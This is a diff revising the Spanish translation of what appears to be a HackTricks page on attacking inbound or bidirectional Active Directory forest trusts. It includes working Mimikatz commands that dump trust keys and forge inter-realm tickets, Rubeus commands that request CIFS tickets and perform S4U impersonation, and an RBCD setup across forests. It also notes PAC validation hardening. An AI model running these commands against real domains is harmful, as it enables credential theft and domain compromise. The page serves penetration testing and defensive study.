@@ -1,12 +1,12 @@
-# External Forest Domain - OneWay (Inbound) o bidirectional
+# Dominio de bosque externo - OneWay (Entrante) o bidireccional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-En este escenario, un dominio externo confía en ti (o ambos confían entre sí), por lo que puedes obtener algún tipo de acceso a él.
+En este escenario, un dominio externo confía en ti (o ambos confían entre sí), por lo que puedes obtener algún tipo de acceso sobre él.
 
-## Enumeration
+## Enumeración
 
-En primer lugar, necesitas **enumerar** la **trust**:
+En primer lugar, necesitas **enumerar** la **confianza**:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -63,11 +63,11 @@ Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFil
 
 En la enumeración anterior se descubrió que el usuario **`crossuser`** pertenece al grupo **`External Admins`**, que tiene **Admin access** dentro del **DC del dominio externo**.
 
-## Initial Access
+## Acceso inicial
 
-Si **no pudiste** encontrar ningún acceso **especial** de tu usuario en el otro dominio, aún puedes volver a la AD Methodology e intentar hacer **privesc desde un usuario sin privilegios** (cosas como kerberoasting, por ejemplo):
+Si **no pudieras** encontrar ningún acceso **especial** de tu usuario en el otro dominio, aún puedes volver a la AD Methodology e intentar hacer **privesc desde un usuario sin privilegios** (por ejemplo, cosas como kerberoasting):
 
-Puedes usar las **funciones de Powerview** para **enumerar** el **otro dominio** utilizando el parámetro `-Domain`, como en:
+Puedes usar **funciones de Powerview** para **enumerar** el **otro dominio** utilizando el parámetro `-Domain`, como en:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -75,22 +75,22 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ./
 {{#endref}}
 
-## Impersonation
+## Suplantación
 
-### Iniciar sesión
+### Inicio de sesión
 
-Usando un método normal con las credenciales de los usuarios que tienen acceso al dominio externo deberías poder acceder a:
+Usando un método normal con las credenciales de los usuarios que tienen acceso al dominio externo, deberías poder acceder a:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### Abuso de SID History
 
-También podrías abusar de [**SID History**](sid-history-injection.md) a través de una confianza entre forests.
+También podrías abusar de [**SID History**](sid-history-injection.md) a través de una confianza entre bosques.
 
-Si un usuario es migrado **de un forest a otro** y **SID Filtering no está habilitado**, es posible **añadir un SID del otro forest**, y este **SID** será **añadido** al **token del usuario** al autenticarse **a través de la confianza**.
+Si un usuario se migra **de un bosque a otro** y **SID Filtering no está habilitado**, es posible **añadir un SID del otro bosque**, y este **SID** se **añadirá al token del usuario** al autenticarse **a través de la confianza**.
 
 > [!WARNING]
-> Como recordatorio, puedes obtener la signing key con
+> Como recordatorio, puedes obtener la clave de firma con
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
@@ -103,7 +103,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current do
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
@@ -117,13 +117,13 @@ Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:d
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
 ### RBCD entre bosques cuando controlas una cuenta de máquina en el bosque de confianza (sin SID filtering / selective auth)
 
-Si tu foreign principal (FSP) te incluye en un grupo que puede escribir objetos de equipo en el bosque de confianza (p. ej., `Account Operators`, un grupo de provisioning personalizado), puedes configurar **Resource-Based Constrained Delegation** en un host objetivo de ese bosque e impersonar a cualquier usuario allí:
+Si tu foreign principal (FSP) te incluye en un grupo que puede escribir objetos de equipo en el bosque de confianza (por ejemplo, `Account Operators` o un grupo de provisioning personalizado), puedes configurar **Resource-Based Constrained Delegation** en un host objetivo de ese bosque e impersonar a cualquier usuario allí:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,15 +134,14 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-Esto solo funciona cuando **SelectiveAuthentication está deshabilitado** y el **SID filtering** no elimina tu SID de control. Es una ruta lateral rápida que evita falsificar SIDHistory y que a menudo se pasa por alto en las revisiones de trusts.<sup>[[2]](#references)</sup>
+Esto solo funciona cuando **SelectiveAuthentication está deshabilitado** y **SID filtering** no elimina tu SID de control. Es una vía lateral rápida que evita la falsificación de SIDHistory y que a menudo se pasa por alto en las revisiones de trusts.<sup>[[2]](#references)</sup>
 
-### Hardening de la validación PAC
+### Refuerzo de la validación de PAC
 
-Las actualizaciones de validación de firmas PAC para **CVE-2024-26248**/**CVE-2024-29056** añaden la exigencia de firma en los tickets entre forests. En **Compatibility mode**, las rutas inter-realm PAC/SIDHistory/S4U falsificadas todavía pueden funcionar en DCs sin parchear. En **Enforcement mode**, los datos PAC sin firmar o manipulados que atraviesan un forest trust se rechazan, a menos que también tengas la trust key del forest de destino. Los overrides del registro (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) pueden debilitar esto mientras sigan disponibles.<sup>[[1]](#references)</sup>
+Las actualizaciones de validación de firmas PAC para **CVE-2024-26248**/**CVE-2024-29056** añaden la exigencia de firma en los tickets entre forests. En el **Compatibility mode**, las rutas falsificadas de PAC inter-realm, SIDHistory y S4U aún pueden funcionar en DCs sin parchear. En el **Enforcement mode**, los datos PAC sin firma o manipulados que atraviesen un forest trust se rechazan, a menos que también tengas la trust key del forest de destino. Los overrides del registro (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) pueden debilitar esto mientras sigan disponibles.<sup>[[1]](#references)</sup>
 
-## Referencias
+## References
 
-- [1] [Microsoft KB5037754 – Cambios en la validación PAC para CVE-2024-26248 y CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [1] [Microsoft KB5037754 – Cambios en la validación de PAC para CVE-2024-26248 y CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
 - [2] [Especificación MS-PAC – Detalles sobre SID filtering y la transformación de claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
-
 {{#include ../../banners/hacktricks-training.md}}
